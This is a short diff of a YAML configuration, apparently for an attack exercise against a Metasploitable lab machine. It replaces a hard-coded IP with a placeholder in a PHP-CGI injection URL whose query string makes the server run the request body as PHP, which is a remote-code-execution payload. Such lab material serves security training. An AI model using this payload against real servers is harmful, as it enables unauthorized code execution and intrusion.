@@ -42,7 +42,7 @@ vars:
   WEBSERV_PORT: "8080"
   # The PHP-CGI injection URL. The query string enables include wrappers
   # and sets the prepend file to php://input (the request body).
-  PHP_RCE_URL: 'http://192.168.56.101/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input'
+  PHP_RCE_URL: 'http://<INSERT_METASPLOITABLE_IP>/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input'
 
 commands:
   # ============================================
